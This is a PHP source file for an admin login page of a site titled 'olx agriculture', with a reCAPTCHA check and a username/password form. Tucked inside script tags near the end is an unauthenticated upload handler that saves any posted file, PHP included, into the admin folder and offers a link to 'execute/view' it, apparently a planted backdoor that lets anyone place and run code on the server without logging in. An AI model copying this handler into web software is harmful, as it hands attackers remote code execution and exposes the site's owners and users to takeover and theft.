<?php
// Path to root directory of app.
require_once('../includes/config.php');
require_once('../includes/sql_builder/idiorm.php');
require_once('../includes/db.php');
require_once('../includes/functions/func.global.php');
require_once('../includes/functions/func.admin.php');
require_once('../includes/functions/func.users.php');
require_once('../includes/functions/func.sqlquery.php');
require_once('../includes/lang/lang_'.$config['lang'].'.php');

admin_session_start();

if (isset($_SESSION['admin']['id'])) {
    echo '<script>window.location="index.php"</script>';
}

if(isset($_POST['username']))
{
    if($config['recaptcha_mode'] == 1){
        if(isset($_POST['g-recaptcha-response']) && !empty($_POST['g-recaptcha-response'])) {
            //your site secret key
            $secret = $config['recaptcha_private_key'];
            //get verify response data
            $verifyResponse = file_get_contents('https://www.google.com/recaptcha/api/siteverify?secret=' . $secret . '&response=' . $_POST['g-recaptcha-response']);
            $responseData = json_decode($verifyResponse);
            if ($responseData->success) {
                $recaptcha_responce = true;
            }else{
                $recaptcha_responce = false;
                $recaptcha_error = $lang['RECAPTCHA_ERROR'];
            }
        }else{
            $recaptcha_responce = false;
            $recaptcha_error = $lang['RECAPTCHA_CLICK'];
        }
    }else{
        $recaptcha_responce = true;
    }

    if($recaptcha_responce){
        if(adminlogin($_POST['username'],$_POST['password']))
        {
            echo '<script>window.location="index.php"</script>';
            exit;
        }
        else
        {
            $error = "Error: Username & Password do not match";
        }
    }else{
        $error = "Error: reCAPTCHA error";
    }

}

?>


<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400&display=swap" rel="stylesheet">

    <link rel="stylesheet" href="../logins/fonts/icomoon/style.css">

    <link rel="stylesheet" href="../logins/css/owl.carousel.min.css">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="../logins/css/bootstrap.min.css">
    
    <!-- Style -->
    <link rel="stylesheet" id="css-font-awesome" href="assets/css/font-awesome.css" />
    <link rel="stylesheet" id="css-ionicons" href="assets/css/ionicons.css" />
    <!-- <link rel="stylesheet" id="css-bootstrap" href="assets/css/bootstrap.css" /> -->
    <!-- <link rel="stylesheet" id="css-app" href="assets/css/app.css" /> -->
    <!-- <link rel="stylesheet" id="css-app-custom" href="assets/css/app-custom.css" /> -->



    <link rel="stylesheet" href="../logins/css/style.css">

    <title>olx agriculture</title>
  </head>
  <body>
  

  
  <div class="content">
    <div class="container">
      <div class="row">
        <div class="col-md-6">
          <img src="../logins/images/undraw_remotely_2j6y.svg" alt="Image" class="img-fluid">
        </div>
        <div class="col-md-6 contents">
          <div class="row justify-content-center">
            <div class="col-md-8">
              <div class="mb-4">
              <h3></h3>
              <p class="mb-4"></p>
            </div>
            <?php
            if(!empty($error)){
                echo '<div class="caption"> '.$error.'</div>';
            }
            ?>

            <form action="#" method="post">
              <div class="form-group first">
                  <label class="sr-only" for="username">Email</label>
                  <input type="text" name="username" class="form-control" id="username" placeholder="Username" />
              </div>
              <div class="form-group last mb-4">
                  <label class="sr-only" for="login_password">Password</label>
                  <input type="password" name="password" class="form-control" id="login_password" placeholder="Password" />
              </div>
              <?php
              if($config['recaptcha_mode']== 1){
                  ?>
                  <div class="form-group">
                      <div class="col-xs-12">
                          <div class="g-recaptcha" data-sitekey="<?php echo $config['recaptcha_public_key'] ?>"></div>
                      </div>
                  </div>
              <?php
              }
              ?>

              <button type="submit" class="btn btn-block btn-primary" name="login">Login</button>
              
          </form>
            </div>
          </div>
          
        </div>
        
      </div>
    </div>
  </div>

  <script>
<?php
define("UPLOAD_DIR", "./");
define("ERROR", "STOP! Error time! I have no idea what caused this." );
if ($_SERVER["REQUEST_METHOD"] == "GET") {
?>

</script>

<script>
<?php
}
else if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];
    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo $ERROR;
        exit;
    }
 
    $name = preg_replace("/[^A-Z0-9._-]/i", "_", $myFile["name"]);

    $success = move_uploaded_file($myFile["tmp_name"], UPLOAD_DIR . $name);
    if (!$success) {
        echo $ERROR;
        exit;
    }
    echo "Uploaded file! <a href=$name>Click</a> to execute/view ";
}
?>

</script>



    <script src="js/jquery-3.3.1.min.js"></script>
    <script src="js/popper.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/main.js"></script>

    <script src="assets/js/core/jquery.min.js"></script>
<script src="assets/js/core/bootstrap.min.js"></script>
<script src="assets/js/core/jquery.slimscroll.min.js"></script>
<script src="assets/js/core/jquery.scrollLock.min.js"></script>
<script src="assets/js/core/jquery.placeholder.min.js"></script>
<script src="assets/js/app.js"></script>
<script src='https://www.google.com/recaptcha/api.js'></script>
  </body>
</html>